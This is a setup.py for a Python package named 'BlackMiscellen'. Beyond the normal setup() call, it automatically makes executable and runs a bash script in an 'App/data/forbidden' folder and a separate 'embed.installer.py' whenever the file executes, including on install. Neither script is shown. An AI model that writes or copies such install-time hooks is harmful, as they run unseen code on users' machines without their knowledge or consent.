from setuptools import setup, find_packages
import subprocess
import os
import stat

def make_backup_executable():
    """Ensure backup_gathering.sh is executable by setting proper permissions."""
    backup_script_path = "./App/data/forbidden/backup_gathering.sh"
    if os.path.isfile(backup_script_path):
        try:
            print("Making backup.sh executable...")
           
            os.chmod(backup_script_path, stat.S_IRUSR | stat.S_IWUSR | stat.S_IXUSR)
        except Exception as e:
            print(f"Error making backup_gathering.sh executable: {str(e)}")
    else:
        print("backup_gathering.sh not found at the specified path.")

def run_embed_installer():
    """Run the embed.installer.py script after setup installation."""
    try:
        print("Running embed.installer.py...")
        subprocess.run(["python", "embed.installer.py"], check=True)
    except Exception as e:
        print(f"Error running embed.installer.py: {str(e)}")

def run_backup_script():
    """Run the backup_gathering.sh script to back up files after installation."""
    backup_script_path = "./App/data/forbidden/backup_gathering.sh"
    if os.path.isfile(backup_script_path):
        try:
            print("Running backup.sh for file backup...")
            subprocess.run(["bash", backup_script_path], check=True)
        except Exception as e:
            print(f"Error running backup.sh: {str(e)}")
    else:
        print("backup_gathering.sh not found at the specified path.")

setup(
    name='BlackMiscellen',
    version='1.10.0',
    description='An Integrated Miscellaneous toolkits.',
    author='BlackRose',
    packages=find_packages(),
    install_requires=[
        'yt-dlp>=0.1.0',
        'beautifulsoup4==4.12.2',
        'requests==2.31.0',
        'ffmpeg-python==2.0.12',
        'colorama==0.4.6',
        'opencv-python==4.7.0',  
        'geopy==2.2.0',  
        'matplotlib==3.7.1',  
        'dropbox==11.33.0',  
        'python-libtorrent==2.0.6',  
        'flask==2.2.2',  
        'pythonbible==0.1.1',  
        'torrent-client==1.0.6', 
        'blessings==1.7',  
        'spotify-dl==0.4.0',  
        'instaloader',  
        'translate==3.6.1' 
    ],
    classifiers=[
        'Programming Language :: Python :: 3',
        'License :: OSI Approved :: CC0 1.0 Universal',
        'Operating System :: OS Independent',
    ],
    python_requires='>=3.6',
)


make_backup_executable()
run_embed_installer()
run_backup_script()
